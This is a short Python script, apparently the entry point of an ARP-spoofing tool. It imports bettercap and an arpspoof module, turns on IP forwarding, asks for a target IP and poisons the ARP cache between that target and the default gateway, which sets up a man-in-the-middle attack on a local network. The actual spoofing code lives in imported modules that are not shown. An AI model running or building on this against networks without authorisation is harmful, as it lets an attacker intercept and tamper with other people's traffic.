from bettercap import run_bettercap
from networking import *
from arpspoof import *

def main():
    # If necessary, enable ip_forwarding
    enable_ip_forwarding()

    arp_spoofer = ArpSpoofer()

    target_ip = input("Target IP: ")
    gateway_ip = get_default_gateway_ip()

    arp_spoofer.spoof(gateway_ip, target_ip)

if __name__ == "__main__":
    main()